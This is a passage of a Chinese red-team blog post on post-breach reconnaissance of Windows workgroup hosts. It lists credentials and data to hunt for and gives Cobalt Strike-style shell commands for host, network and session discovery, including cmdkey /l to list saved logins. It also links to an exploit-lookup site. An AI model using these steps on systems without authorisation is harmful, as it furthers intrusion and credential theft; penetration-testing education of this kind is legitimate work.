<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="0x00 前置 当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：\n我是谁？&ndash;主机身份与特权边界确认。\n这是哪？&ndash;对目前机器处网络环境的拓扑结构进行分析和判断。\n我在哪？&ndash;对目前机器所处伪造区域的判断。\n谁在哪？&ndash;对比钱机器反防御技术识别网络中的安全监控节点。\n">
<title>【内网攻防】Windows工作组信息收集</title>

<link rel='canonical' href='http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/'>

<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【内网攻防】Windows工作组信息收集">
<meta property='og:description' content="0x00 前置 当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：\n我是谁？&ndash;主机身份与特权边界确认。\n这是哪？&ndash;对目前机器处网络环境的拓扑结构进行分析和判断。\n我在哪？&ndash;对目前机器所处伪造区域的判断。\n谁在哪？&ndash;对比钱机器反防御技术识别网络中的安全监控节点。\n">
<meta property='og:url' content='http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/'>
<meta property='og:site_name' content='SlimerのBlog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-28T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-08-28T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/13.webp' />
<meta name="twitter:title" content="【内网攻防】Windows工作组信息收集">
<meta name="twitter:description" content="0x00 前置 当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：\n我是谁？&ndash;主机身份与特权边界确认。\n这是哪？&ndash;对目前机器处网络环境的拓扑结构进行分析和判断。\n我在哪？&ndash;对目前机器所处伪造区域的判断。\n谁在哪？&ndash;对比钱机器反防御技术识别网络中的安全监控节点。\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/images/13.webp' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "auto");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1bd8e8462945ae7f.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">SlimerのBlog</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/274685458?spm_id_from=333.1007.0.0'
                        target="_blank"
                        title="bilibili"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1756871816299" class="icon" viewBox="0 0 1084 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3388" xmlns:xlink="http://www.w3.org/1999/xlink" width="271" height="256"><path d="M896.43834 165.698h-62.34l54.57-54.57c23.43-23.37 23.43-70.17 0-93.54-23.37-23.37-70.17-23.37-93.54 0l-155.88 148.17H452.17034l-155.94-148.23c-23.43-23.37-70.17-23.37-93.54 0-23.37 23.43-23.43 70.17 0 93.54l54.57 54.57h-62.34A192.983 192.983 0 0 0 0.00934 360.607v420.899c0 116.97 85.71 202.68 194.91 202.68h693.75a192.983 192.983 0 0 0 194.85-194.85v-428.73c7.83-109.14-77.94-194.91-187.08-194.91z m54.63 615.809a69.869 69.869 0 0 1-70.17 70.17h-678.27a69.869 69.869 0 0 1-70.109-70.17v-413.13a69.869 69.869 0 0 1 70.17-70.17h678.21a69.869 69.869 0 0 1 70.17 70.17v413.19z m-608.039-342.96a69.869 69.869 0 0 0-70.23 70.17v70.17a69.869 69.869 0 0 0 70.17 70.17 69.869 69.869 0 0 0 70.23-70.17v-70.17a69.869 69.869 0 0 0-70.23-70.17z m405.36 0a69.869 69.869 0 0 0-70.23 70.17v70.17a69.869 69.869 0 0 0 70.17 70.17 69.869 69.869 0 0 0 70.23-70.17v-70.17a69.869 69.869 0 0 0-70.17-70.17z" p-id="3389" fill="#d4237a"></path></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/SSlimes'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1756871620871" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9490" xmlns:xlink="http://www.w3.org/1999/xlink" width="256" height="256"><path d="M682.215454 981.446137c-25.532318 0-42.553863-17.021545-42.553864-42.553864v-165.960067c4.255386-34.043091-8.510773-59.575409-29.787704-80.852341-12.766159-12.766159-17.021545-29.787704-8.510773-42.553864 4.255386-17.021545 21.276932-25.532318 34.043091-29.787704 123.406204-12.766159 238.301635-55.320023 238.301635-255.323181 0-46.80925-17.021545-93.6185-51.064636-131.916976-12.766159-12.766159-12.766159-29.787704-8.510772-42.553864 12.766159-34.043091 12.766159-68.086182 4.255386-102.129272-21.276932 4.255386-55.320023 17.021545-110.640045 55.320022-8.510773 8.510773-21.276932 8.510773-34.043091 4.255387-89.363113-25.532318-187.236999-25.532318-276.600112 0-12.766159 4.255386-25.532318 4.255386-38.298477-4.255387C307.741455 104.836549 269.442978 92.07039 248.166047 87.815004c-8.510773 34.043091-8.510773 68.086182 4.255386 102.129272 4.255386 17.021545 4.255386 34.043091-8.510773 42.553864-34.043091 38.298477-51.064636 85.107727-51.064636 131.916976 0 200.003158 114.895431 242.557022 238.301635 255.323181 17.021545 0 29.787704 12.766159 34.043091 29.787704 4.255386 17.021545 0 34.043091-8.510773 42.553864-21.276932 21.276932-29.787704 46.80925-29.787704 76.596954v165.960068c0 25.532318-17.021545 42.553863-42.553863 42.553863s-42.553863-17.021545-42.553864-42.553863v-72.341568c-127.66159 21.276932-182.981613-51.064636-221.28009-97.873886-17.021545-21.276932-29.787704-38.298477-46.80925-42.553864-21.276932-4.255386-38.298477-29.787704-29.787704-51.064636 4.255386-21.276932 29.787704-38.298477 51.064636-29.787704 42.553863 12.766159 68.086182 42.553863 93.6185 72.341568 34.043091 46.80925 63.830795 80.852341 153.193908 63.830795v-4.255386c0-25.532318 4.255386-55.320023 12.766159-76.596955-119.150818-25.532318-246.812408-102.129272-246.812408-327.664748 0-63.830795 21.276932-123.406204 59.575409-170.215454-17.021545-59.575409-12.766159-114.895431 12.766159-170.215454 4.255386-12.766159 12.766159-21.276932 25.532318-25.532318 17.021545-4.255386 72.341568-12.766159 187.236999 59.575409 93.6185-21.276932 191.492386-21.276932 280.855499 0 110.640045-72.341568 170.215454-63.830795 187.236999-59.575409 12.766159 4.255386 21.276932 12.766159 25.532319 25.532318 21.276932 55.320023 25.532318 110.640045 12.766159 165.960067 38.298477 46.80925 59.575409 106.384659 59.575408 170.215454 0 242.557022-144.683136 306.387817-246.812408 331.920135 8.510773 25.532318 12.766159 55.320023 12.766159 80.852341V938.892273c0 25.532318-17.021545 42.553863-42.553863 42.553864z" p-id="9491" fill="#d4237a"></path></svg>
                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页 | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>关于 | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档 | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索 | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>链接 | Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#0x00-前置">0x00 前置</a></li>
    <li><a href="#0x01-要收集的信息">0x01 要收集的信息</a></li>
    <li><a href="#0x02-windows信息收集">0x02 Windows信息收集</a></li>
    <li><a href="#0x04-探测网段存活">0x04 探测网段存活</a></li>
    <li><a href="#0x05-针对件内容的信息搜集">0x05 针对⽂件内容的信息搜集</a></li>
    <li><a href="#0x06-配置信息收集">0x06 配置信息收集</a></li>
    <li><a href="#0x07-网络资产搜集">0x07 网络资产搜集</a></li>
    <li><a href="#0x08-内网工具">0x08 内网工具</a></li>
    <li><a href="#0x09-密码凭证收集">0x09 密码凭证收集</a></li>
    <li><a href="#0x10-用户操作相关">0x10 用户操作相关</a></li>
    <li><a href="#0x11-查看防墙相关">0x11 查看防⽕墙相关</a></li>
    <li><a href="#0x12-rdp操作相关">0x12 RDP操作相关</a></li>
    <li><a href="#0x13-志痕迹相关">0x13 ⽇志痕迹相关</a></li>
    <li><a href="#0x13-cs插件">0x13 CS插件</a></li>
  </ul>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                
                    <img src="/images/13.webp" loading="lazy" alt="Featured image of post 【内网攻防】Windows工作组信息收集" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E7%BA%A2%E9%98%9F/" style="background-color: #ff6b6b; color: #ffffff;">
                红队
            </a>
        
            <a href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/" style="background-color: #2b2d42; color: #edf2f4;">
                内网攻防
            </a>
        
		
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">【内网攻防】Windows工作组信息收集</a>
        </h2>
    
        
    </div>

    
    
    
	
    
	
    <footer class="article-time">
        
            <div>
                <time class="article-time--published">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>2025年08月28日</time>
                <span class="article-word-count">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 2H6a2 2 0 0 0 -2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2V8z" /><polyline points="14 2 14 8 20 8" /><line x1="16" y1="13" x2="8" y2="13" /><line x1="16" y1="17" x2="8" y2="17" /><polyline points="10 9 9 9 8 9" /></svg>
                    文章共3338字
                </span>
            </div>
			
        

        
    </footer>
    

    
	
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="0x00-前置">0x00 前置</h1>
<p>当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：<br>
我是谁？&ndash;主机身份与特权边界确认。<br>
这是哪？&ndash;对目前机器处网络环境的拓扑结构进行分析和判断。<br>
我在哪？&ndash;对目前机器所处伪造区域的判断。<br>
谁在哪？&ndash;对比钱机器反防御技术识别网络中的安全监控节点。</p>
<h1 id="0x01-要收集的信息">0x01 要收集的信息</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">操作系统
</span></span><span class="line"><span class="cl">当权用户权限
</span></span><span class="line"><span class="cl">内网IP段（网卡信息）
</span></span><span class="line"><span class="cl">杀毒软件（AV）
</span></span><span class="line"><span class="cl">端口开放情况
</span></span><span class="line"><span class="cl">系统补丁
</span></span><span class="line"><span class="cl">网络状态
</span></span><span class="line"><span class="cl">共享文件夹
</span></span><span class="line"><span class="cl">远程信息
</span></span><span class="line"><span class="cl">服务信息
</span></span><span class="line"><span class="cl">软件列表
</span></span><span class="line"><span class="cl">计划任务
</span></span><span class="line"><span class="cl">启动项
</span></span><span class="line"><span class="cl">系统日志
</span></span><span class="line"><span class="cl">防火墙规则
</span></span><span class="line"><span class="cl">网络代理信息
</span></span><span class="line"><span class="cl">内网OA办公系统
</span></span><span class="line"><span class="cl">邮件服务器
</span></span><span class="line"><span class="cl">网络监控系统
</span></span><span class="line"><span class="cl">财务应用系统
</span></span><span class="line"><span class="cl">核心产品源码（SVN/Git 服务器）
</span></span><span class="line"><span class="cl">管理员密码
</span></span><span class="line"><span class="cl">浏览器密码
</span></span><span class="line"><span class="cl">cookie
</span></span><span class="line"><span class="cl">无线密码
</span></span><span class="line"><span class="cl">数据库密码
</span></span><span class="line"><span class="cl">VPN历史密码
</span></span><span class="line"><span class="cl">Teamview 历史密码
</span></span><span class="line"><span class="cl">其他用户 session
</span></span><span class="line"><span class="cl">3389 连接记录
</span></span><span class="line"><span class="cl">IPC$ 连接记录
</span></span><span class="line"><span class="cl">各用户回收站信息
</span></span><span class="line"><span class="cl">用户列表
</span></span><span class="line"><span class="cl">host 文件
</span></span><span class="line"><span class="cl">DNS 缓存信息
</span></span><span class="line"><span class="cl">补丁信息
</span></span><span class="line"><span class="cl">端口信息
</span></span><span class="line"><span class="cl">账户密码策略
</span></span><span class="line"><span class="cl">账号锁定策略
</span></span><span class="line"><span class="cl">Web 服务器配置文件
</span></span><span class="line"><span class="cl">Web 服务器日志
</span></span><span class="line"><span class="cl">......
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="0x02-windows信息收集">0x02 Windows信息收集</h1>
<h3 id="1-主机信息收集">1. 主机信息收集</h3>
<p>查看当前用户以及当前用户所在组，所拥有的权限。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell whoami /all
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715000825.png" alt="image.png"></p>
<h3 id="2-网卡和ip信息收集">2. 网卡和IP信息收集</h3>
<p>查看网卡等基本网络配置信息，主要留意Ethernet0以及Ethernet1，这个网卡，记录了可以通的网段信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell ipconfig /all
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715001546.png" alt="image.png"><br>
可以看出当前是两个网卡，并且主DNS是一个域名（这里环境有问题，一般看DNS是一个域名，既是域环境。），一般来说只有域机器才会有域名显示，而在工作组下显示的是空：</p>
<h3 id="3-查看系统详情信息">3. 查看系统详情信息</h3>
<p>可以查看网卡，系统，补丁信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell systeminfo
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002249.png" alt="image.png"><br>
我们可以通过该命令获得了系统的信息，就可以直接使用下面网站获取exp。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://bypass.tidesec.com/exp/
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接复制粘贴过来即可<br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002637.png" alt="image.png"><br>
<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715002708.png" alt="image.png"></p>
<h3 id="4-查看操作系统和版本信息">4. 查看操作系统和版本信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">英文版系统用这个命令：
</span></span><span class="line"><span class="cl">shell systeminfo | findstr /B /C:&#34;OS Name&#34; /C:&#34;OS Version&#34;
</span></span><span class="line"><span class="cl">中文版系统用这个命令：
</span></span><span class="line"><span class="cl">shell systeminfo | findstr /B /C:&#34;OS 名称&#34; /C:&#34;OS 版本&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003206.png" alt="image.png"></p>
<h3 id="5-查看系统体系结构">5. 查看系统体系结构</h3>
<p>检查系统架构（AMD64或者x86）-&gt;影响后续工具选择</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell echo %PROCESSOR_ARCHITECTURE%
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003409.png" alt="image.png"></p>
<h3 id="6-主机路由信息">6. 主机路由信息</h3>
<p>可以查看网络目标，都是主机可以直接访问到的机器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell route print
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715003943.png" alt="image.png"></p>
<h3 id="7-arp缓存信息">7. ARP缓存信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell arp -a
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004046.png" alt="image.png"></p>
<h3 id="8-dns缓存信息">8. DNS缓存信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell ipconfig /displaydns
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004213.png" alt="image.png"></p>
<h3 id="9-host文件信息">9. Host文件信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell type C:\windows\System32\drivers\etc\hosts
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004319.png" alt="image.png"></p>
<h3 id="10-端口连接信息">10. 端口连接信息</h3>
<p>可以查看当前主机的端口链接情况，一级当前主机与网络中的主机连接建立情况，不仅有公网主机还有内网主机。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell netstat -ano
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004540.png" alt="image.png"></p>
<h3 id="11-会话连接">11. 会话连接</h3>
<p>可以查看主机与客户机之间的会话连接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net session
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004712.png" alt="image.png"></p>
<h3 id="12-查看当前保存的登录凭证也能看到通的ip">12. 查看当前保存的登录凭证，也能看到通的ip</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell cmdkey /l
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004813.png" alt="image.png"></p>
<h3 id="13-查看当前主机开启的共享列表">13. 查看当前主机开启的共享列表</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net share
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715004915.png" alt="image.png"></p>
<h3 id="14-远程相关信息">14. 远程相关信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">相关链接：
</span></span><span class="line"><span class="cl">http://bypass.tidesec.com/bycms
</span></span><span class="line"><span class="cl">命令：
</span></span><span class="line"><span class="cl">shell tasklist
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250715005059.png" alt="image.png"></p>
<h3 id="15-查看当前主机与网络中的其他主机建立的共享链接">15. 查看当前主机与网络中的其他主机建立的共享链接</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
